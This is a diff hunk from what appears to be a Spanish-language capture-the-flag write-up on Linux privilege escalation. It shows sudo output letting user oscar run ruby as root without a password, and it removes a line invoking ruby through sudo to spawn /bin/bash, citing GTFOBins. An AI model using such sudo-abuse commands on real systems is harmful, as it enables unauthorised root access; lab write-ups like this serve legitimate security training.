@@ -122,7 +122,6 @@ Procedo a enumerar binarios con privilegios de SUDO:
 -----------------------------------------------------------
 User oscar may run the following commands on a15681e926ec:
     (ALL) NOPASSWD: /usr/bin/ruby
-$ sudo -u /usr/bin/ruby -r 'exec "/bin/bash"'
 ```
 
 Descubrí el binario _ruby_ y decidí buscarlo en `gtfobins` para explotarlo
